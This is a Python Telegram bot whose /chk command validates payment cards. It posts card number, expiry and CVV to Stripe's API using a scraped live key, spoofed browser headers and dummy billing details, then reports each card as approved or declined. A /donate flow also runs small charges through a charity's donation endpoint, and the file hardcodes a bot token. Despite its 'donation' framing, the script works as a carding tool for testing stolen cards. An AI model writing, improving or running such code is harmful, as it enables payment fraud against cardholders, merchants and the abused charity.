import requests
import re
import random
import string
import logging
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# --- SECURITY WARNING ---
# This script handles financial data. Do not use real credit card details
# unless you intend to make a real donation and understand the code.
# Keep your Telegram Bot Token secure and private.
# --- END WARNING ---

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define states for the conversation
GET_DETAILS = range(1)

# ==============================================================================
# UTILITY AND CORE FUNCTIONS
# ==============================================================================

def generate_random_string(length=10):
    """Generate a random string for session identifiers"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def process_credit_card(cc_input):
    """Parse CC input in format CC|MM|YYYY|CVV"""
    # Use regex to be more flexible with separators
    parts = re.split(r'[|/]', cc_input)
    if len(parts) != 4:
        raise ValueError("Invalid format. Expected CC|MM|YYYY|CVV")
    
    return {
        'number': re.sub(r'\s+', '', parts[0]),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip()[-2:],
        'cvc': parts[3].strip()
    }

def mask_card_number(number):
    """Masks a credit card number for display."""
    return f"{number[:6]}xxxxxx{number[-4:]}"

# NEW: Refactored function for Stripe Authorization
def stripe_auth_check(cc_input):
    """
    Performs a Stripe authorization check to validate a card.
    Returns a dictionary with the outcome.
    """
    try:
        card_details = process_credit_card(cc_input)
    except ValueError as e:
        return {"success": False, "message": str(e), "card_details": None}

    # Generate fresh session identifiers for the check
    muid = f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
    guid = generate_random_string(32)
    sid = generate_random_string(32)

    stripe_headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    # Use dummy data for billing details, as it's just an auth
    stripe_data = {
        'type': 'card',
        'billing_details[email]': 'check@test.com',
        'billing_details[name]': 'Test Check',
        'card[number]': card_details['number'],
        'card[cvc]': card_details['cvc'],
        'card[exp_month]': card_details['exp_month'],
        'card[exp_year]': card_details['exp_year'],
        'guid': guid, 'muid': muid, 'sid': sid,
        'payment_user_agent': 'stripe.js/f5ddf352d5; stripe-js-v3/f5ddf352d5; card-element',
        'key': 'pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
    }

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
        response_data = response.json()

        if response.status_code == 200 and 'id' in response_data:
            return {"success": True, "message": "Approved", "payment_method_id": response_data['id'], "card_details": card_details}
        else:
            error_message = response_data.get('error', {}).get('message', 'An unknown error occurred.')
            return {"success": False, "message": error_message, "card_details": card_details}

    except requests.exceptions.RequestException as e:
        return {"success": False, "message": f"Network error: {e}", "card_details": card_details}
    except Exception as e:
        return {"success": False, "message": f"An unexpected error occurred: {e}", "card_details": card_details}


# MODIFIED: This function now uses the refactored stripe_auth_check
def make_donation(cc_input, email, name, amount=5):
    """Complete the donation process."""
    auth_result = stripe_auth_check(cc_input)
    
    if not auth_result["success"]:
        return auth_result

    payment_method_id = auth_result["payment_method_id"]
    
    # Step 2: Submit donation to charity: water server
    donation_headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.charitywater.org',
        'referer': 'https://www.charitywater.org/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    donation_data = {
        'country': 'us',
        'payment_intent[email]': email,
        'payment_intent[amount]': str(amount * 100), # Amount in cents
        'payment_intent[currency]': 'usd',
        'payment_intent[payment_method]': payment_method_id,
        'donation_form[amount]': str(amount),
        'donation_form[email]': email,
        'donation_form[name]': name.split()[0] if ' ' in name else name,
        'donation_form[surname]': name.split()[1] if ' ' in name else '',
        'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
    }

    try:
        donation_response = requests.post('https://www.charitywater.org/donate/stripe', headers=donation_headers, data=donation_data)
        if donation_response.status_code == 200:
             return {"success": True, "message": "Donation successful! Thank you."}
        else:
             return {"success": False, "message": "Donation submission failed.", "response": donation_response.text}
    except Exception as e:
        return {"success": False, "message": f"An error occurred during donation submission: {str(e)}"}

# ==============================================================================
# TELEGRAM BOT HANDLERS
# ==============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a welcome message."""
    await update.message.reply_text(
        "Welcome!\n\n"
        "🔹 To check a card: `/chk CARD|MM|YYYY|CVV`\n"
        "🔹 To make a donation: `/donate`"
    )

# NEW: Command handler for /chk
async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /chk command to validate a card."""
    if not context.args:
        await update.message.reply_text("Please provide a card to check.\nUsage: `/chk 1234...|MM|YY|CVV`", parse_mode='Markdown')
        return

    cc_input = " ".join(context.args)
    
    # Let the user know the bot is working
    processing_message = await update.message.reply_text("Checking card...")
    
    result = stripe_auth_check(cc_input)
    
    if result["success"]:
        status_line = "approve ✅"
        gateway_line = "Stripe Auth ✅"
    else:
        status_line = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        gateway_line = "Stripe Auth ❌"

    # Use a placeholder if card details couldn't be parsed
    card_display = "Invalid Format"
    if result["card_details"]:
        card_display = mask_card_number(result["card_details"]["number"])
        
    response_message = result['message']

    # Format the final response string
    final_response = (
        f"{status_line}\n\n"
        f"𝗖𝗮𝗿𝗱: `{card_display}`\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_line}\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_message}"
    )
    
    # Edit the "Checking card..." message with the final result
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=processing_message.message_id,
        text=final_response,
        parse_mode='Markdown'
    )

async def donate_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the donation conversation."""
    await update.message.reply_text(
        "To make a $5 donation, provide the details in the following format, with each item on a new line:\n\n"
        "`CC_NUMBER|MM|YYYY|CVV`\n"
        "`your.email@example.com`\n"
        "`Your Full Name`\n\n"
        "Type /cancel to exit.",
        parse_mode='Markdown'
    )
    return GET_DETAILS

async def get_details(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives details for donation, processes it, and ends conversation."""
    user_input = update.message.text
    lines = user_input.strip().split('\n')

    if len(lines) != 3:
        await update.message.reply_text("Incorrect format. Please try again or type /cancel.")
        return GET_DETAILS

    cc_input, email, name = lines[0], lines[1], lines[2]
    await update.message.reply_text("Processing your donation, please wait...")
    result = make_donation(cc_input=cc_input, email=email, name=name, amount=5)

    if result["success"]:
        await update.message.reply_text(f"✅ Success: {result['message']}")
    else:
        logger.error(f"Donation failed. Reason: {result.get('response', result['message'])}")
        await update.message.reply_text(f"❌ Error: {result['message']}")
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation."""
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

def main() -> None:
    """Run the bot."""
    application = Application.builder().token("7859087070:AAEYzfZeZqLSarYVyL_KcsJqudhVCqqjnao").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("donate", donate_start)],
        states={
            GET_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_details)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", check_card)) # Add the new /chk handler
    application.add_handler(conv_handler) # Add the conversation handler for /donate

    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
